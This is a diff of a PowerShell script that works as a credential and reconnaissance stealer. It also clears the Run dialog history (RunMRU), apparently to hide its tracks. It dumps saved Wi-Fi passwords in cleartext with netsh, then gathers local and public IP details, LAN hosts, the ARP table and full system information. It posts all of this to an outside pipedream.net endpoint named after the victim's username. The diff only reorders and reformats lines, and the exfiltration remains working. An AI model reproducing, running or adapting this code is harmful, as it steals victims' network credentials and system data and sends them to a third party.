@@ -48,16 +48,19 @@ Remove-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunM
 $local = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"})
 $ip = $local.IPv4Address.IPAddress.split(".")
 $tmp = $ip[0] +'.'+ $ip[1] +'.'+ $ip[2] +'.'
-$local = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"}) | Out-String
-$lan = Find-LANHosts -ip @((0..255|%{"$tmp$_"})) | Out-String
-$wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {@{$name = $pass}} 
-$info = Get-ComputerInfo 
-$public = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content) 
-$net = arp -a 
 
+$lan = Find-LANHosts -ip @((0..255|%{"$tmp$_"})) 
+
+$local = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"}) | Out-String
+
+$wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {@{$name = $pass}} 
+
+$info = Get-ComputerInfo | ConvertTo-Json | ConvertFrom-Json 
+
+$public = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content) 
+
+$net = arp -a 
 
 $data = New-Object -TypeName psobject -Property @{"wifi" = $wifi; "local" = $local; "public" = $public ; "lan" = $lan; "net" = $net ; "info" = $info} | ConvertTo-Json
 
 Invoke-RestMethod https://encssv4vtly2.x.pipedream.net/$(whoami) -Method Post -Body $data
-
-$data = $wifi + $local + $public + $lan + $net + $info 
